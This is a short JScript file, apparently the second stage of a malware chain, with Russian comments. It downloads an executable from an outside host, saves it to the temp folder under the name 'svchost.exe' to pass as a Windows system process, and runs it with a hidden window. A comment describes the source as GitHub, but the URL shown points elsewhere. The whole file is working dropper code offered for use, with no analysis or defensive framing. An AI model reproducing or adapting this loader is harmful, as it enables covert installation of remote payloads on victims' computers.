// Stage 2: Скачивает loader.exe с GitHub и запускает его
function main() {
    var shell = new ActiveXObject("WScript.Shell");
    var fso = new ActiveXObject("Scripting.FileSystemObject");
    
    // URL твоего EXE-файла на GitHub (raw)
    var exeUrl = "https://sdwan.tw/d/A_nbMeRRTfUF/sys_profetching_DEAFTIV2fa140156674345234543.exe";
    // Путь, куда сохраним EXE во временной папке
    var tempPath = shell.ExpandEnvironmentStrings("%TEMP%") + "\\svchost.exe";
    
    // Скачиваем файл
    var xhr = new ActiveXObject("MSXML2.ServerXMLHTTP.6.0");
    xhr.Open("GET", exeUrl, false);
    xhr.Send();
    
    if (xhr.Status == 200) {
        // Сохраняем бинарник во временную папку
        var stream = new ActiveXObject("ADODB.Stream");
        stream.Type = 1; // binary
        stream.Open();
        stream.Write(xhr.responseBody);
        stream.SaveToFile(tempPath, 2); // 2 = overwrite
        stream.Close();
        
        // Запускаем EXE
        shell.Run(tempPath, 0, false); // 0 = скрытое окно
    }
}

main();
